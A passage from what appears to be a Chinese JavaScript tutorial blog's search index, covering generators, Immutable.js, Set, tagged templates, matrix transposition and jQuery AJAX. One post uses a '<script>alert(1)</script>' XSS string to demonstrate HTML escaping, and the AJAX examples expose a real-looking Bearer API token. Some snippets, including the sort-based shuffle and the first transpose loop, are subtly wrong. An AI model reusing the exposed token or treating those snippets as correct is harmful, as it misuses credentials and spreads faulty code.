因此這些拿不到資料的情況我們必須自己處理，透過「人工拋出 Exception」的方式來達成，否則的話是不會進入 catch 區塊的哦！ 至於 finally 的部分很簡單，因為不論最後 fetch 成功還是失敗都要停止 loading（isPending）的狀態，所以把 setIsPending 放在這邊來處理會是不錯的選擇。 關於 Error 物件這個物件最主要會包含兩個東西： name message name 是用來說明這是什麼型別的例外，常見的有： Error 通用的錯誤（通常用在客製化） RangeError（數字超出範圍） ReferenceError（找不到變數） SyntaxError（語法錯誤） TypeError（找不到函式） URIError（當用了內建的 URI Method 卻給了不合法的 URI 格式） EvalError（不正確的使用 Eval 這個函式） 所以我們透過 throw 來拋出錯誤時，就是在指定這 name 跟 message 這兩個東西。像 throw new Error(response.statusText) 的意思就是拋出一個： name = Error（種類） message = response.statusText（內容） 的例外情形。 這邊看完後再回去看上面的例子應該就會理解許多了，希望之後對於錯誤處理能夠越來越掌握。 參考資源 [JS] Error Handling","link":"/2022/06/22/javascript-error-handling/"},{"title":"快速入門 generator","text":"一個有點邊緣的東西，但學起來還不錯。 簡述最近想要學習 redux saga 這個東西，如果你聽過這東西的話就應該也知道學 saga 會需要一些 generator 的前備知識。 總之，為了讓接下來學習 redux saga 能夠順利，決定來稍微認識一下這個東西。 什麼是 generator？我覺得用範例來解釋最快，所以先來看段 code： 123456789101112131415function* myGenerator() { for (let i = 1; i &lt;= 3; i++) { yield i }}// 回傳值是一個迭代器// 但比起這個說法，我覺得「可以暫停的 function」 是一個更好理解的方式。const iterable = myGenerator()console.log(iterable.next()) // { value: 1, done: false }console.log(iterable.next()) // { value: 2, done: false }console.log(iterable.next()) // { value: 3, done: false }console.log(iterable.next()) // { value: undefined, done: true }console.log(iterable.next()) // { value: undefined, done: true }console.log(iterable.next()) // { value: undefined, done: true } 使用 generator 的方式就是在 function 後面加上一個 *，雖然也可以加在名稱前面，但我還是偏好加在 function 後面。 接著執行這個 function 時，跟一般的 function 有個最大的不同，就是它不會立即執行每一圈迴圈，跑到迴圈結束為止，而是會被「暫停住」，然後回傳一個 iterable。 至於什麼是 iterable？簡單來說，你只要想成每一次我 call iterable.next() 時，它就會找到下一個 yield 的位置，繼續往下執行，直到又碰到下一個 yield 為止。 因為我每一次都是在迭代 yield 這個關鍵字，所以才會說是「iterable（可迭代的）」 另外 next() 有回傳值，內容長這樣： 12345// typescripttype res = { value: string done: boolean} 以剛剛的例子來說你大概就猜的出來用意了，value 就是 yield 後面接的值，而 done 則是用來表示「目前有沒有 yield？」 順道一提，如果 generator 有 return 回傳值的話，結果就會變這樣： 123456789101112function* myGenerator() { for (i = 1; i &lt;= 3; i++) { yield i } return i}const iterable = myGenerator()console.log(iterable.next()) // { value: 1, done: false }console.log(iterable.next()) // { value: 2, done: false }console.log(iterable.next()) // { value: 3, done: false }console.log(iterable.next()) // { value: 4, done: true } 算是一個特例，可以讓你在 done: true 的時候還能拿到 value，不過一般不會這樣用，這邊只是順便提一下。 這就是關於 generator 的最最最基本的用法。 在 next 中傳入參數這是另一個在 generator 中很重要的觀念，建議一定要弄懂。 簡單來說，在 next 傳入的參數可以「改寫上一個 yield 的值」，一樣來看例子： 1234567891011function* myGenerator(x) { const y = 2 * (yield x + 1) const z = yield y / 3 return x + y + z}const iterable = myGenerator(5)console.log(iterable.next().value)console.log(iterable.next(12).value)console.log(iterable.next(13).value) 看起來有夠複雜，但只要照著 code 來一步一步來執行就會好懂一些了： iterable.next() 因為這是第一個 yield，所以不傳入參數，5 + 1 得到 6。 iterable.next(12) 依照剛剛說的，把上一個 yield 後面的值全部改寫，所以就會從 (x + 1) 變成 12。 接著 const y = 2 * 12 得到 24，所以目前的 yield 後面的值就會是 8（24 / 3）。 iterable.next(13) 一樣把上一個 yield 後面的值全部改寫，所以就會從 y / 3 變成 13。 最後這次因為是 return，所以 5 + 24 + 13 得到 42 如果有點難懂的話，可以想成這樣： 12345function* myGenerator (5) { const y = 2 * (yield (12)); const z = yield (13); return 5 + 24 + 13;} for … ofiteralbe 可以用 for...of 來遍歷 yield 的值： 1234567891011121314function* myGenerator() { yield 1 yield 4 yield 10}const iterable = myGenerator()for (const x of iterable) { // 1 // 4 // 10 console.log(x)} 總之呢，我覺得最重要的是一定要分清楚 next() 跟 next(param) 的行為有什麼不同，目前關於 generator 的部分先知道這些就差不多了，剩下的有時間再去研究就好。 最後，如果你想試看看用 generator 來實作「非同步」操作的話，可以參考：從 callback 到 Promise 再到 generator 。 參考資料 淺入淺出 Generator Function","link":"/2022/05/19/javascript-generator/"},{"title":"JavaScript－Immutable.JS","text":"有機會的話想導入看看。 簡述Immutable（不可變）在開發中是一個很重要的概念，它有幾個優點： 可預測性 可追朔性 減少 Side Effect 在 JavaScript 裡「Array」和「Object」都是 mutable（可變）的資料型態，這時候如果沒有用「Immutable 的觀念」來操作的話就會引發一些不可預測的行為。 舉例來說，假設我有一個 Array，我想取出最後一筆的值，這時候就會出現「原本的 Array 也被改掉了」的情況發生，像這樣： 1234const array = [1, 2, 3, 4, 5]const lastOne = array.pop()console.log(lastOne) // 5console.log(array) // [ 1, 2, 3, 4 ] 我確實拿到了最後一個值 5，但注意原本的 array 也被改掉了。 為了不改變原本的 array，我們可以用「拷貝」的方式來做，像這樣： 12345const array = [1, 2, 3, 4, 5]const lastOne = [...array].pop()console.log(lastOne) // 5console.log(array) // [1, 2, 3, 4, 5] 這邊是用「淺拷貝」來做複製，當資料型態更複雜時你可能會需要用「深拷貝」來處理。只是順便提一下，不是這篇要提的重點。 總之這種作法就是「Immutable」的觀念，我每一次都是「產生一個全新的物件」，而不是直接去改「原本的 Reference」，所以原本的 array 永遠不會被動到。 不過這就引發了另外一個問題： 如果我只是想改某個地方，卻又要先把原始資料整筆複製一份的話，豈不是有點浪效能？ 所以這篇就來介紹 Immutable.js，一個由臉書開源出來的套件。 List建立方式這個基本上就是 JS 中的 Array，建立方式也很簡單： 123const list = List([1, 2, 3, 4, 5])console.log(list) // List [ 1, 2, 3, 4, 5 ]console.log(list.toJS()) // [ 1, 2, 3, 4, 5 ] toArray其中一個轉成 JS 的方法，但要注意是「淺拷貝」： 123456789// 淺拷貝const list = List([[1], 2, 3, 4, 5])const toArray1 = list.toArray()const toArray2 = list.toArray()console.log(toArray1) // [ [ 1 ], 2, 3, 4, 5 ]console.log(toArray2) // [ [ 1 ], 2, 3, 4, 5 ]console.log(toArray1 === toArray2) // falseconsole.log(toArray1[0] === toArray2[0]) // true toJS轉成 JS 的方法，這個才是「深拷貝」： 123456789// 深拷貝const list = List([[1], 2, 3, 4, 5])const toArray1 = list.toJS()const toArray2 = list.toJS()console.log(toArray1) // [ [ 1 ], 2, 3, 4, 5 ]console.log(toArray2) // [ [ 1 ], 2, 3, 4, 5 ]console.log(toArray1 === toArray2) // falseconsole.log(toArray1[0] === toArray2[0]) // false isList檢查值是不是 List 這個型態： 12345const array = [1, 2, 3, 4, 5]const list = List([[1], 2, 3, 4, 5])console.log(List.isList(array)) // falseconsole.log(List.isList(list)) // true of如果要透過 List 來建立新的 List 的話，要注意值只能是 Array，不可以是別的值： 1234// 正確的作法const list1 = List([1, 2, 3])// 錯誤的作法（TypeError）const list2 = List(1, 2, 3) 如果要傳非 Array 的值的話要改用 of 來建立： 1234567const list1 = List.of(1, 2, 3)const list2 = List.of({ name: 'PeaNu', age: 20 })const list3 = List.of(false, true)console.log(list1.toArray()) // [ 1, 2, 3 ]console.log(list2.toArray()) // [ { name: 'PeaNu', age: 20 } ]console.log(list3.toArray()) // [ false, true ] size用來查看長度（length）的屬性： 12const list = List([1, 2, 3])console.log(list.size) // 3 set用來設定陣列值的方法： 12345678910111213const list = List([1, 2, 3])const list2 = list.set(3, 4)console.log(list2.toArray()) // [ 1, 2, 3, 4 ]const list3 = list.set(0, 100)console.log(list3.toArray()) // [ 100, 2, 3 ]const list4 = list.set(5, 10)console.log(list4.toArray()) // [ 1, 2, 3, undefined, undefined, 10 ]const list5 = list.set(-1, 0)console.log(list5.toArray()) // [1, 2, 0] delete刪除陣列值，可以想成是 Imuutable 的 splice(0, index)： 123456789const list = List([1, 2, 3, 4, 5])const list1 = list.delete(0)console.log(list1.toArray()) // [ 2, 3, 4, 5]const list2 = list.delete(3)console.log(list2.toArray()) // [1, 2, 3, 5]const list3 = list.delete(-1)console.log(list3.toArray()) // [1, 2, 3, 4] insert在指定的 index 中插值： 123456const list = List([1, 2, 3, 4, 5])const list2 = list.insert(0, 0)console.log(list2.toArray()) // [ 0, 1, 2, 3, 4, 5 ]const list3 = list.insert(2, 'Hi')console.log(list3.toArray()) // [ 1, 2, 'Hi', 3, 4, 5 ] push &amp; pop熟悉的 push 與 pop，不過是 Immutable 版： 12345const list = List([1, 2, 3, 4, 5])const list2 = list.push(6)console.log(list.toArray()) // [ 1, 2, 3, 4, 5 ]console.log(list2.toArray()) // [ 1, 2, 3, 4, 5, 6 ] 12345const list = List([1, 2, 3, 4, 5])const list2 = list.pop()console.log(list.toArray()) // [ 1, 2, 3, 4, 5 ]console.log(list2.toArray()) // [ 1, 2, 3, 4 ] shift &amp; unshift熟悉的 shift 與 unshift，不過是 Immutable 版： 1234567const list = List([1, 2, 3, 4, 5])const list2 = list.unshift(0)const list3 = list.shift()console.log(list.toArray()) // [ 1, 2, 3, 4, 5 ]console.log(list2.toArray()) // [ 0, 1, 2, 3, 4, 5 ]console.log(list3.toArray()) // [ 2, 3, 4, 5 ] merge把兩個陣列合併： 1234const a = List([1, 2, 3, 4, 5])const b = List([6, 7, 8, 9])console.log(a.merge(b).toArray()) // [1, 2, 3, 4, 5, 6, 7, 8, 9] sortBy想快速用「字典序」來排序的時候還不錯用： 123const foods = List([{ name: 'Orange' }, { name: 'Grape' }, { name: 'Banana' }, { name: 'Candy' }])const sortedFoods = foods.sortBy((food) =&gt; food.name)console.log(sortedFoods.toArray()) 輸出結果： 1;[{ name: 'Banana' }, { name: 'Candy' }, { name: 'Grape' }, { name: 'Orange' }] Map簡單來說就是物件，基本上都跟 List 的用法差不多，所以這裡就直接示範了。 建立方式直接把 Object 傳進去就行了： 12const map = Map({ name: 'PeaNu', age: 20, gender: 'man' })console.log(map.toObject()) // { name: 'PeaNu', age: 20, gender: 'man' } set設定內容（單層）： 12const map = Map().set('name', 'PeaNu').set('age', 20).set('gender', 'man')console.log(map.toObject()) // { name: 'PeaNu', age: 20, gender: 'man' } setIn設定內容（多層）： 1234567891011121314151617181920212223const a = Map({ name: 'PeaNu', age: 20, gender: 'man', relation: { wife: 'PPB', father: 'JOJO', friend: 'DIO' }})const newOne = a.setIn(['relation', 'father'], 'Caesar')// {// name: 'PeaNu',// age: 20,// gender: 'man',// relation: {// wife: 'PPB',// father: 'Caesar',// friend: 'DIO'// }// }console.log(newOne.toObject()) delete刪除某個屬性（單個）： 12345678const map = Map({ name: 'PeaNu', age: 20, gender: 'man'})const map2 = map.delete('name')console.log(map.toObject()) // { name: 'PeaNu', age: 20, gender: 'man' }console.log(map2.toObject()) // { gender: 'man', age: 20 } deleteAll刪除多個欄位（傳陣列）： 1234567const map = Map({ name: 'PeaNu', age: 20, gender: 'man'})const map2 = map.deleteAll(['name', 'age'])console.log(map2.toObject()) // { gender: 'man' } merge合併： 123456789101112131415161718192021const a = Map({ name: 'PeaNu', age: 20, gender: 'man'})const b = Map({ brother: 'JOJO', father: 'DIO', wife: 'PPB'})// {// name: 'PeaNu',// age: 20,// gender: 'man',// brother: 'JOJO',// father: 'DIO',// wife: 'PPB'// }console.log(a.merge(b).toObject()) mergeWith一般的 merge 如果碰到「相同值」的話會直接覆寫，如果你希望「不要覆蓋」，想做一些處理的話可以改用這個方式： 123456789101112const a = Map({ a: 10, b: 20, c: 30 })const b = Map({ a: 40, b: 50, e: 60, f: 30 })const result1 = a.mergeWith((oldVal, newVal) =&gt; { // Ex: a(10) + a(40) return oldVal + newVal}, b)const result2 = a.merge(b)console.log(result1.toObject()) // { a: 50, b: 70, c: 30, e: 60, f: 30 }console.log(result2.toObject()) // { a: 40, b: 50, c: 30, e: 60, f: 30 } map給 Object 用的 map，我覺得很酷： 123const obj = Map({ a: 10, b: 20 })const obj2 = obj.map((num) =&gt; num * 2)console.log(obj2.toObject()) // { a: 20, b: 40 } reverse可以反轉內容： 123const obj = Map({ a: 10, b: 20 })const obj2 = obj.reverse()console.log(obj2.toObject()) sort神奇的排序： 1234567const obj = Map({ a: 5, b: 12, c: 10, d: 8, e: 24, f: 3 })const asc = obj.sort((a, b) =&gt; b - a)const desc = obj.sort((a, b) =&gt; a - b)console.log(asc.toObject()) // { e: 24, b: 12, c: 10, d: 8, a: 5, f: 3 }console.log(desc.toObject()) // { f: 3, a: 5, d: 8, c: 10, b: 12, e: 24 }","link":"/2022/08/13/javascript-immutable-js/"},{"title":"JavaScript 來看看神奇的 ? 跟 ?? 運算子","text":"??????（到底在？ Nullish Coalescing Operator ??運算子簡單來說，一般我們在決定預設值的時候會用 || 來做短路運算： 12345678910111213const person = { name: null, interesting: '', age: 0}const name = person.name || 'PeaNu'const interesting = person.interesting || 'coding'const age = person.age || 18console.log(name) // 'PeaNu'console.log(interesting) // 'coding'console.log(age) // 18 在上面的例子因為 null、\"\" 和 0 都是假值，所以會套用 || 後面的預設值。 可是有些時候我們可能就是想要這些假值，這時候就可以用到 ?? 運算子了。這個東西叫做「Nullish coalescing operator」，是 ES2020（ES11） 推出的功能。 直接來看範例吧： 12345678910111213const person = { name: null, interesting: '', age: 0}const name = person.name ?? 'PeaNu'const interesting = person.interesting ?? 'coding'const age = person.age ?? 18console.log(name) // 'PeaNu'console.log(interesting) // \"\"console.log(age) // 0 只要不是 null undefined 這些「真假值」，對 ?? 而言都是真值，所以就可以把 0 \"\" 這些假值給留下來。 Optional chaining operator 可選串連這個東西主要是用來解決「存取屬性」的問題，先來看個例子： 123456789const response = { rows: [ { name: 'PeaNu' } ]}if (response.rows[0].name === 'PeaNu') console.log('this is peanu') 假如我們想看第一筆資料的 name 是不是 PeaNu 的話可能就會像上面這樣子寫，可是這樣有一個問題，那就是如果今天 rows 是空的話怎麼辦？ 1234const response = { rows: []}if (response.rows[0].name === 'PeaNu') console.log('this is peanu') 這時候就會噴 Error，跟你說 can't not read property of undefined，然後程式就掛了。 所以你可能就會改成這樣寫： 1234const response = { rows: []}if (response.rows[0] &amp;&amp; response.rows[0].name === 'PeaNu') console.log('this is peanu') 利用短路運算先確認 row[0] 是有東西的才去存取 name，就能避免程式出錯。 好，這樣看起來問題是解決了，可是今天如果要存取的屬性「在很裡面」呢？ 1234567891011121314151617181920const response = { rows: [ { name: 'PeaNU', age: 20, relationship: { girlFriend: 'PPB', father: 'FeaNut', mother: 'CeaNut' } } ]}if ( response.rows[0] &amp;&amp; response.rows[0].relationship &amp;&amp; response.rows[0].relationship.girlFriend &amp;&amp; response.rows[0].relationship.girlFriend === 'PPB') console.log('peanu has girlfriend') 當東西越裡面時，就需要越多個 &amp;&amp; 來做運算，有沒有更好的做法？ 這時候 ? 就派上用場了，用 ? 可以改寫成這樣： 1234567891011121314const response = { rows: [ { name: 'PeaNU', age: 20, relationship: { girlFriend: 'PPB', father: 'FeaNut', mother: 'CeaNut' } } ]}if (response.rows[0]?.relationship?.girlFriend === 'PPB') console.log('peanu has girlfriend') 意思跟剛剛是一樣的，他會一路從 row[0]、relationship 往下存取，只要 ? 前面的東西不存在，就會直接回傳 undefined，所以就能避免掉 Error 的問題。","link":"/2022/05/05/javascript-nullish-coalescing-operator-and-optional-chaining-operator/"},{"title":"JavaScript 還不錯用的 set","text":"最近才發現這個好用的方法。 簡述new Set 是 ES6 推出的一種資料型態，如果你不希望「Array 裡出現重複的值」，這個絕對好用。 先來看個簡短的範例，你大概就知道用法了： 123456789101112131415161718192021222324252627const obj = { name: 'PeaNu'}const mySet = new Set() // {}mySet.add(1)mySet.add(1) // 重複的不會放進去mySet.add(3)mySet.add(3) // 重複的不會放進去mySet.add(5)mySet.add(6)mySet.add(obj)console.log(mySet) // { 1, 3, 5, 6, {name: 'PeaNu'} }console.log(mySet.has(3)) // trueconsole.log(mySet.has(4)) // falseconsole.log(mySet.delete(obj)) // true 刪除成功console.log(mySet.delete(7)) // false 刪除失敗console.log(mySet) // { 1, 3, 5, 6 }console.log(mySet.size) // 4// 下面這幾個還不太確定用途，可以先知道一下就好。console.log(mySet.entries())console.log(mySet.keys())console.log(mySet.values()) 接下來會示範幾個實際應用。 過濾掉陣列中重複的元素因為 new 出來的 Set 會是 Object，所以記得用 ... 轉成 Array 就好了。 1234const array = [1, 1, 3, 4, 5, 6, 6, 3, 4]const mySet = new Set(array) // { 1, 3, 4, 5, 6 }const filterArray = [...mySet] // 轉成 arrayconsole.log(filterArray) // [1, 3, 4, 5, 6] 檢查陣列中是否包含某物件123456789101112131415161718192021222324const classroom = new Set()const PeaNu = { id: 1, name: 'PeaNu' }const PPB = { id: 2, name: 'PPB' }const Nick = { id: 3, name: 'Nick' }// 把學生加入 Setclassroom.add(PeaNu)classroom.add(PPB)classroom.add(Nick)// 檢查 PeaNu 在不在 Set 裡if (classroom.has(PeaNu)) { console.log(`${PeaNu.name} is in the classroom`)}// 移除 Nickclassroom.delete(Nick)if (!classroom.has(Nick)) { console.log('Can not find Nick')}// 顯示 Set 的數量console.log(`Now there are ${classroom.size} students`)","link":"/2022/04/23/javascript-set/"},{"title":"JavaScript－shuffle（洗牌的方法）","text":"慢慢累積經驗。 題目假設我有一份這樣的資料： 1const data = [1, 2, 3, 4, 5, 6, 7, ...] 如果我想打亂順序的話有什麼做法？ 方法一可以利用 Math.random - 0.5 搭配 sort 來隨機的交換位置： 1const shuffled = data.sort(() =&gt; Math.random() - 0.5) 這應該是最簡潔的做法，原理是利用 Math.random 只會產生 0 ~ 0.99999 的特性。在這個範圍中 -0.5，就有一半的機會得到「正數 / 負數」。 接著再搭配 sort 的 compare function，在這裡面只要回傳正數就會交換位置，負數的話就不換位置，所以透過前面產生的 N 個正數和 M 個負數就會組合出不同的位置。 方法二這是我自己想到的方法，感覺效能上可能不太好，但也不失為一種作法。 簡單來說就是給一個長度，裡面會不按照順序來放數字，例如：長度為 4，結果產出 [0, 3, 1, 2] 這樣的東西。 這些數字是要拿來當作 index 用的，不如直接看 code 吧： 1234567891011121314function createRandomNumArray(total) { const res = new Array(0) while (res.length &lt; total) { // 產生 0 ~ total 間的數字（包含 0 &amp; total） const num = Math.floor(Math.random() * total) // 排除掉重複的數字 if (res.some((n) =&gt; n === num)) { continue } else { res.push(num) } } return res} 接著只要利用它來產生新的陣列就行了： 12const data = [1, 2, 3, 4]const shuffledData = createRandomNumArray(data.length).map((i) =&gt; data[i]) 總之這也是一種方法，但不建議用在資料量很大的時候，因為要一直排除掉重複的數字可能會浪費很多計算。","link":"/2022/06/29/javascript-shuffle/"},{"title":"字串模板的進階用法 tagged-template","text":"第一次知道！ 簡述ES6 中的「template string」除了最原本的字串拼接用途以外，它還能用來 trigger function，用法是這樣子： 1console.log`hello` // ['hello'] 放在裡面的東西會被轉成 Array 再傳入進去，這是第一種用法。 第二種用法是加上 ${...}，它的行為比較特別一點，邊看例子邊解釋： 12const name = 'peanu'console.log`hello ${name}` // ['hello ', ''] peanu 簡單來說，沒有用 ${...} 包住的內容會被用 Array 來包裝，而 ${...} 的部分會被放到後面去。（關於 Array 裡的空字串，你只要記得每當出現 ${...} 的地方後面都會自動補一個空字串。這個行為會讓我們用起來比較方便，不用太執著原因。） OK，你可能會想說這可以做啥？讓我再舉個例子： 12345678910// ...運算子會把剩下的 params 變成 arrayfunction saySometing(a, ...b) { console.log('a: ', a) console.log('b: ', b)}const name = 'peanu'const msg = 'how are you'const time = 'today'saySometing`hello ${name}, ${msg}, ${time}` 發現了嗎？透過這種方式我就可以把參數拆成兩個部分，一個是純字串，一個是 ${...}。 所以呢，用這招我就可以做出一個用來「過濾惡意字串（XSS）」的 function： 12345678910111213function safeHTML(template, ...unsafe) { // 在 template[0] 跟 template[i+1] 之間 join 不安全字串 let result = template[0] for (let i = 0; i &lt; unsafe.length; i++) { result += unsafe[i].replace(/&amp;/g, '&amp;amp;').replace(/&lt;/g, '&amp;lt;').replace(/&gt;/g, '&amp;gt;') result += template[i + 1] } return result}const unsafe = `&lt;script&gt;alert(1)&lt;/script&gt;`let message = safeHTML`&lt;p&gt;${unsafe} has ${unsafe} sent you a message.&lt;/p&gt;`console.log(message) 總之只是想介紹一下這種 trigger function 的另外一種用途，這也是 style component 的執行原理。","link":"/2022/04/04/javascript-tagged-template/"},{"title":"用 JavaScript 來寫出轉置矩陣的方式","text":"久違的邏輯時間～ 簡述假設我有以下陣列： 123456const array = [ [1, 2, 3], [1, 2, 3], [1, 2, 3], [1, 2, 3]] 我希望轉置後變成這樣： 12345;[ [1, 1, 1, 1], [2, 2, 2, 2], [3, 3, 3, 3]] 第一種方式這裡的思路是這樣： 先用一層迴圈遍歷每個 row 每一圈都建立一個新的 array 接著在用第二層迴圈遍歷每個 row 這時候第二層迴圈就可以利用外層迴圈的 i，來取出第 j 個 row 的第 i 個值 最後一個步驟最重要，但也比較難懂一些，建議搭配下面的 code 多想幾遍。 簡單來說原理就是外面的迴圈一定要等裡面的迴圈跑完才會跑下一圈，所以可以確保在跑 j 迴圈的時候 i 的值是固定的，所以就可以達成這樣的效果： array[0][0] array[1][0] array[2][0] … 123456789101112131415const array = [ [1, 2, 3], [1, 2, 3], [1, 2, 3], [1, 2, 3]]const newArray = []for (let i = 0; i &lt; array.length; i++) { newArray.push([]) for (let j = 0; j &lt; array.length; j++) { newArray[i].push(array[j][i]) }} 第二種方式我先寫簡化過後的版本，只要一行就搞定： 123function transpose(matrix) { return matrix[0].map((col, i) =&gt; matrix.map((row) =&gt; row[i]))} 但這樣一定看不懂，所以一樣來拆解這個流程： 12345678910111213141516const array = [ [1, 2, 3], [1, 2, 3], [1, 2, 3], [1, 2, 3]]// 第一層 mapconst newArray3 = []for (let i = 0; i &lt; array[0].length; i++) { // 第二層 map const tempArray = [] for (let j = 0; j &lt; array.length; j++) { tempArray.push(array[j][i]) } newArray3.push(tempArray)} 你仔細看就會發現這跟第一種作法的思路是差不多的，重點都是要拿出： array[0][0] array[1][0] array[2][0] … 只是這邊是先遍歷 column，藉此取得 column 的長度，接著在遍歷每個 row，一樣利用 i 會等 j 跑完的概念來把每個 row 的第 i 個值拿出來產生一個新的陣列，最後再包一層陣列來產出最後的結果。（這邊聽不懂的話，建議你先回上面把第一種弄懂再回來看，應該會好理解一些）","link":"/2022/04/17/javascript-transpose-matrix/"},{"title":"用 jQuery 發 AJAX","text":"筆記一下，不然有點雜。 簡述這裡會拿這隻 API 來示範。 主要是有些參數容易搞混，這邊先說明清楚： dataType 預期 server 要回傳的資料格式，沒指定的話就看 server 怎麼設定。 contentType 要傳給 server 的資料格式，沒指定的話會是 application/x-www-form-urlencoded; charset=UTF-8 傳送原生表單資料（application/x-www-form-urlencoded）HTML： 1234567&lt;form method=\"POST\" action=\"https://gorest.co.in/public/v2/users\"&gt; &lt;div&gt;&lt;input name=\"name\" type=\"text\" /&gt;&lt;/div&gt; &lt;div&gt;&lt;input name=\"gender\" type=\"text\" /&gt;&lt;/div&gt; &lt;div&gt;&lt;input name=\"email\" type=\"email\" /&gt;&lt;/div&gt; &lt;input name=\"status\" value=\"active\" type=\"hidden\" /&gt; &lt;input type=\"submit\" value=\"送出\" /&gt;&lt;/form&gt; jQuery： 12345678910111213141516171819202122// 取得表單元素const form = $('form')// 設定監聽器form.bind('submit', (e) =&gt; { // 停止預設行為 e.preventDefault() // 發出 request $.ajax({ url: 'https://gorest.co.in/public/v2/users', type: 'POST', headers: { Authorization: 'Bearer xxxx' }, // 預期回傳的資料格式 dataType: 'json', // 要傳過去的資料格式 contentType: 'application/x-www-form-urlencoded; charset=UTF-8', // serialize() 取得表單的欄位值 data: $('form').serialize(), success: (response) =&gt; console.log(response) })}) serialize() 是 jQuery 提供的方法，用來把表單資料轉成這樣的 url 的字串格式：name=xxx&amp;gender=xxx&amp;。 它會根據 selector 決定是「整個表單」還是「單一元素」，詳細可參考官方說明 用 FormData 物件發 POSTFormData 因為是用物件來包資料，所以要特別設定兩個東西： processData: false 不要去動資料 contentType: false 不要設定 contentType HTML： 1234567&lt;form method=\"POST\" action=\"https://gorest.co.in/public/v2/users\"&gt; &lt;div&gt;&lt;input name=\"name\" type=\"text\" /&gt;&lt;/div&gt; &lt;div&gt;&lt;input name=\"gender\" type=\"text\" /&gt;&lt;/div&gt; &lt;div&gt;&lt;input name=\"email\" type=\"email\" /&gt;&lt;/div&gt; &lt;input name=\"status\" value=\"active\" type=\"hidden\" /&gt; &lt;input type=\"submit\" value=\"送出\" /&gt;&lt;/form&gt; jQuery： 123456789101112131415161718192021222324const form = $('form')// 設定監聽器form.bind('submit', (e) =&gt; { // 阻止預設行為 e.preventDefault() // 用 FormData 設定表單內容 const formData = new FormData(e.target) // 送出 request $.ajax({ url: 'https://gorest.co.in/public/v2/users', type: 'POST', headers: { Authorization: 'Bearer xxx' }, dataType: 'json', // 要傳過去的資料 data: formData, // 這邊一定要設定，不然會： // Uncaught TypeError: Illegal invocation processData: false, contentType: false, success: (response) =&gt; console.log(response) })}) 傳送 JSON 格式的資料HTML： 1&lt;button class=\"btn\"&gt;送出&lt;/button&gt; jQuery： 12345678910111213141516171819202122// 要傳送的資料const data = { name: 'ppasp', gender: 'male', email: 'qwqqekeop@gmail.com', status: 'active'}$('.btn').bind('click', () =&gt; { $.ajax({ url: 'https://gorest.co.in/public/v2/users', type: 'POST', headers: { Authorization: 'Bearer fec7e32332c2367cc51b5669e8397e54f171439891820bfa3bfe420cf6a5c996' }, dataType: 'json', // 要記得 stringify data: JSON.stringify(data), contentType: 'application/json; charset=utf-8', success: (response) =&gt; console.log(response) })}) 直接傳送 JavaScript 物件這種方式要把 Content-Type 設定為 application/x-www-form-urlencoded; charset=UTF-8。從 payload 結果推測是因為直接傳 Object 的話瀏覽器會自動轉成表單的格式：name=xxx&amp;gender=xxx&amp;，所以才要特別設置。 HTML： 1&lt;button class=\"btn\"&gt;送出&lt;/button&gt; jQuery： 12345678910111213141516171819202122const data = { name: 'ppasweqeasp', gender: 'male', email: 'qwqasdqqekeop@gmail.com', status: 'active'}$('.btn').bind('click', () =&gt; { $.ajax({ url: 'https://gorest.co.in/public/v2/users', type: 'POST', headers: { Authorization: 'Bearer fec7e32332c2367cc51b5669e8397e54f171439891820bfa3bfe420cf6a5c996' }, dataType: 'json', // 不做 stringify data: data, // 不是 application/json; charset=utf-8 contentType: 'application/x-www-form-urlencoded; charset=UTF-8', success: (response) =&gt; console.log(response) })})","link":"/2022/02/23/jquery-ajax/"},{"title":"jQuery 隨筆記","text":"隨筆記。 一些常用或容易忘的 API $('selector1, selector2, selectorN') 選取多個元素（就跟 CSS 的概念相同） 123456789&lt;div class=\"parent\"&gt; &lt;p class=\"p1\"&gt;P1&lt;/p&gt; &lt;p&gt;P2&lt;/p&gt; &lt;div class=\"child\"&gt; &lt;p&gt;P3&lt;/p&gt; &lt;p&gt;P4&lt;/p&gt; &lt;/div&gt; &lt;section&gt;&lt;/section&gt;&lt;/div&gt; 12// S.fn.init(2)&nbsp;[div.parent, p.p1]console.log($('.parent, .p1')) get() 把 jQuery 物件變成 DOM 元素（陣列）： 1&lt;div class=\"parent\"&gt;&lt;/div&gt; 1234// S.fn.init&nbsp;[div.parent] -&gt; Objectconsole.log($('.parent'))// [div.parent] -&gt; Arrayconsole.log($('.parent').get()) find('selector') 選到所有子孫元素（多層） 12345678&lt;div class=\"parent\"&gt; &lt;p&gt;P1&lt;/p&gt; &lt;p&gt;P2&lt;/p&gt; &lt;div class=\"child\"&gt; &lt;p&gt;P3&lt;/p&gt; &lt;p&gt;P4&lt;/p&gt; &lt;/div&gt;&lt;/div&gt; 123// 白話來說 = 選到 .parent 底下所有的 p// 接著把每個 p 都設為紅色$('.parent').find('p').css('background-color', 'red') children(['selector']) 選到所有子元素（一層） 12345678&lt;div class=\"parent\"&gt; &lt;p&gt;P1&lt;/p&gt; &lt;p&gt;P2&lt;/p&gt; &lt;div class=\"child\"&gt; &lt;p&gt;P3&lt;/p&gt; &lt;p&gt;P4&lt;/p&gt; &lt;/div&gt;&lt;/div&gt; 12// &lt;p&gt; &lt;p&gt; &lt;div&gt;console.log($('.parent').children()) 裡面也可以再塞新的 selector： 1234567const tagNames = $('.parent') .children('p') // 從 jQuery 物件轉成 DDM 元素 .get() .map((elem) =&gt; elem.tagName)// &nbsp;['P', 'P']console.log(tagNames) JavaScript： 12// &lt;p&gt; &lt;p&gt; &lt;div&gt;console.log(document.querySelector('.parent').children) contents() 選出所有子元素（包含文字節點） 12345678&lt;div class=\"parent\"&gt; &lt;p&gt;P1&lt;/p&gt; &lt;p&gt;P2&lt;/p&gt; &lt;div class=\"child\"&gt; &lt;p&gt;P3&lt;/p&gt; &lt;p&gt;P4&lt;/p&gt; &lt;/div&gt;&lt;/div&gt; jQuery： 12// S.fn.init(7)&nbsp;[text, p, text, p, text, div.child, text]console.log($('.parent').contents()) JavaScript： 12// [text, p, text, p, text, div.child, text]console.log(document.querySelector('.parent').childNodes) attr('attrName', 'attrValue') 設定屬性 jQuery： 12// &lt;div tooltip=\"請輸入內容\"&gt;&lt;/div&gt;$('div').attr('tooltip', '請輸入內容') JavaScript： 12// &lt;div tooltip=\"請輸入內容\"&gt;&lt;/div&gt;document.querySelector('div').setAttribute('tooltip', '請輸入內容') removeAttr('attrName') 刪除屬性 jQuery： 1$('div').removeAttr('tooltip') JavaScript： 1document.querySelector('div').removeAttribute('tooltip') $('parent').append() 把東西放到父元素裡（最後面） 12345&lt;div class=\"container\"&gt; &lt;div&gt;1&lt;/div&gt; &lt;div&gt;2&lt;/div&gt; 